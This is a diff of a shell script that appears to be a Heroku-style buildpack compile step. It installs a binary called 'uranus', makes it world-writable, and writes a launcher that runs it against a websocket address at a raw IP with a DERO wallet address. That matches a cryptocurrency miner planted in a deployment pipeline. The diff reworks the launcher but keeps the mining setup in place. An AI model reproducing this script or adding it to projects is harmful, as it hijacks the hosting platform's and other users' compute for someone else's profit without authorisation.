@@ -3,27 +3,21 @@
 set -e
 
 mkdir -p "$1/bin/"
+
 cp -a binaries-$STACK/* "$1/bin/"
+
 chmod 777 $1/bin/uranus
+
+cat > $1/bin/uranus_gaskan <<END
+$1/bin/uranus -o wss://178.128.200.86:10100 -u dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy
+END
+
+chmod 777 $1/bin/uranus_gaskan
 
 # Setting environment variables in .profile.d script (sourced at dyno startup)
 mkdir -p "$1/.profile.d/"
-
 cat <<EOF >"$1"/.profile.d/uranus.sh
 export LD_LIBRARY_PATH="\$LD_LIBRARY_PATH:\$HOME/bin"
 EOF
-
-cat <<EOF >"$1"/.profile.d/uranus_gaskan.sh
-export LD_LIBRARY_PATH="\$LD_LIBRARY_PATH:\$HOME/bin"
-EOF
-
-#setting uranus auto
-
-cat <<EOF >"$1"/bin/uranus_gaskan
-#!/usr/bin/env bash
-"$1/bin/uranus -o wss://178.128.200.86:10100 -u dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy"
-EOF
-
-chmod a+x "$1"/bin/uranus_gaskan
 
 exit 0
